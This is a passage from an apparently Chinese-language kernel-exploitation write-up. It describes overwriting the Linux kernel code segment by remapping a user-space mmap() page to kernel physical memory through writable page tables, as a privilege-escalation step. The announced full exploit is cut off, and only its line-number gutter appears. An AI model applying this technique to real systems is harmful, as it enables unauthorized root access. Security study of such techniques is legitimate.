:（</strong></p><p>但是改写内核代码段本质上便是向对应的物理页写入数据，而我们又能够读写进程页表，<strong>我们直接在用户空间建立一个到内核代码段对应物理内存的映射就能改写内核代码段了：）</strong></p><p>方便起见，我们可以先通过 <code>mmap()</code> 随便映射一块内存，之后改写 <code>mmap()</code> 的虚拟地址在页表中对应的物理地址即可，这种方法本质上其实就是 <a href="https://vul.360.net/archives/391">用户态映射攻击</a>：</p><p><img src="https://s2.loli.net/2023/05/02/U3BEbFTsZiy48NQ.png" alt="image.png"></p><h2 id="Final-Exploitation"><a href="#Final-Exploitation" class="headerlink" title="Final Exploitation"></a>Final Exploitation</h2><p>最终的完整 exp 如下，<strong>同时包含笔者所给出的三种提权手段的代码</strong>：</p><blockquote><p>由于 page 结构体地址可能出现末字节为 <code>\x00</code> 的情况，故成功几率仅有 75% （悲）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span 